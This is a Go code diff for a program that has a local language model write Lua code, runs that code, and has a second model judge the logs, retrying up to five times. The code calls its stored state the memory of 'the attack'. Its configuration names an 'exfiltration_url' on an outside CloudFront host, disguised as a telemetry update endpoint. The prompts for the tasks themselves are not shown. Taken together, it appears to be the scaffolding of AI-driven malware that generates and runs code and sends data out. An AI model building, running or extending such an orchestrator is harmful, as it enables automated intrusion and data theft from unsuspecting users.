@@ -9,24 +9,23 @@ import (
 	"strings"
 	"time"
 
+	"github.com/PeerDB-io/gluabit32"
 	"github.com/yuin/gopher-lua" // Required: go get github.com/yuin/gopher-lua
 	"layeh.com/gopher-lfs"
-	"github.com/PeerDB-io/gluabit32"
 )
 
 var _ = io.Copy // Use unused import
 
 // Configuration for the simulation
 var config = map[string]string{
-	"ollama_endpoint": "http://localhost:11434/api/generate",
-	"model_name":      "gpt-oss:20b", // Default fallback
-	"exfiltration_url": "https://dnfodqdmlsmq8.cloudfront.net/api/v1/telemetry/update", // Change to 
+	"ollama_endpoint":  "http://localhost:11434/api/generate",
+	"model_name":       "gpt-oss:20b",                                                  // Default fallback
+	"exfiltration_url": "https://dnfodqdmlsmq8.cloudfront.net/api/v1/telemetry/update", // Change to
 }
 
 // globalContext holds the "Memory" of the attack
 var globalContext string
 var currentContext string
-
 
 // 1. Updated Execution: Captures both Output and Errors
 func runLuaWithFeedback(code string) (string, error) {
@@ -97,7 +96,6 @@ func discoverAndSelectModel() bool {
 	return true
 }
 
-
 // 2. The NYU Validator: Inspects logs and artifacts
 func validateTask(taskName string, logs string, execError error) (bool, string) {
 	fmt.Printf("[?] Validating Task: %s...\n", taskName)
@@ -106,7 +104,7 @@ func validateTask(taskName string, logs string, execError error) (bool, string) 
 	if execError != nil {
 		status = fmt.Sprintf("FAILED with error: %v", execError)
 	}
-
+	fmt.Printf("LOGS: %s", logs)
 	// Updated Prompt: Uses "Few-Shot" examples to force the 1b model into the right format
 	validatorPrompt := fmt.Sprintf(`
 	[INST] You are a Lua code validator. Check the logs below.
@@ -115,8 +113,8 @@ func validateTask(taskName string, logs string, execError error) (bool, string) 
 	STATUS: %s
 
 	Rules:
-	1. If the logs show the task worked, return <success>true</success>
-	2. If the logs show an error or empty output, return <success>false</success>
+	1. If the logs show the task worked, showing no errors or permission denied, return <success>true</success>
+	2. If the logs show an error, permission denied, or empty output, return <success>false</success>
 	3. Put a brief explanation in <feedback></feedback> tags.
 
 	Example Response: <success>true</success><feedback>The code printed the directory list.</feedback>
@@ -151,9 +149,11 @@ func validateTask(taskName string, logs string, execError error) (bool, string) 
 
 	return isSuccess, feedback
 }
+
 var aiClient = &http.Client{
 	Timeout: 15 * time.Minute,
 }
+
 func askAI(stepName string, taskPrompt string, context string) string {
 	payload := map[string]interface{}{
 		"model":  config["model_name"],
@@ -162,12 +162,15 @@ func askAI(stepName string, taskPrompt string, context string) string {
 	}
 	jsonData, _ := json.Marshal(payload)
 	resp, err := aiClient.Post(config["ollama_endpoint"], "application/json", bytes.NewBuffer(jsonData))
-	if err != nil { 
+	if err != nil {
 		fmt.Printf("%s Request failed: %v\n", stepName, err)
-		return "" }
+		return ""
+	}
 	defer resp.Body.Close()
 
-	var or struct{ Response string `json:"response"` }
+	var or struct {
+		Response string `json:"response"`
+	}
 	json.NewDecoder(resp.Body).Decode(&or)
 	fmt.Printf("\n[DEBUG] AI Raw Response for %s:\n%s\n-----------\n", stepName, or.Response)
 	return strings.TrimSpace(strings.ReplaceAll(strings.ReplaceAll(or.Response, "```lua", ""), "```", ""))
@@ -176,11 +179,14 @@ func askAI(stepName string, taskPrompt string, context string) string {
 // 3. The Orchestration Loop with Retries
 func executeWithRetry(taskName string, prompt string) string {
 	for i := 0; i < 5; i++ { // Retry up to 5 times
-		code := askAI(taskName, prompt, globalContext + currentContext)
+		code := askAI(taskName, prompt, globalContext+currentContext)
 		output, err := runLuaWithFeedback(code)
-		fmt.Println("Lua Output:", output)
-		
-		success, feedback := validateTask(prompt, output, err)
+		combinedLogs := output
+		if err != nil {
+			combinedLogs += fmt.Sprintf("\nEXECUTION_ERROR: %v", err)
+		}
+
+		success, feedback := validateTask(taskName, combinedLogs, err)
 		if success {
 			fmt.Printf("[+] %s Verified Success.\n", taskName)
 			return output
@@ -191,7 +197,6 @@ func executeWithRetry(taskName string, prompt string) string {
 	}
 	return "TASK_ABORTED"
 }
-
 
 func main() {
 	discoverAndSelectModel()
